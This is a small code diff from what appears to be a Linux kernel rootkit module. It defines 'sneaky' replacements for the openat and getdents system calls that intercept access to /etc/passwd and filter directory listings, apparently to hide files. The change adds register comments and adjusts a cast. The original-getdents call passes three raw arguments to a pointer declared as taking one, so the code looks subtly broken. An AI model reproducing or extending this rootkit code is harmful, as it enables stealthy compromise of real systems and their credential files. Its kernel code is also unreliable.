@@ -43,6 +43,8 @@ asmlinkage int (*original_getdents)(struct pt_regs *);
 asmlinkage ssize_t (*original_read)(struct pt_regs *);
 
 // Define your new sneaky version of the 'openat' syscall
+// int openat(int dirfd, const char *pathname, int flags);
+// DI, SI, DX
 asmlinkage int sneaky_sys_openat(struct pt_regs *regs) {
     // Implement the sneaky part here
     if (strnstr((char *)regs->si, "/etc/passwd", strlen("/etc/passwd")) != NULL) {
@@ -55,7 +57,7 @@ asmlinkage int sneaky_sys_openat(struct pt_regs *regs) {
 // DI, SI, DX
 asmlinkage int sneaky_sys_getdents(struct pt_regs *regs) {
     struct linux_dirent *d;
-    int nread = original_getdents((unsigned int *)regs->di, regs->si, regs->dx);
+    int nread = original_getdents((void *)regs->di, regs->si, regs->dx);
 
     if (nread == -1) {
         return -1;
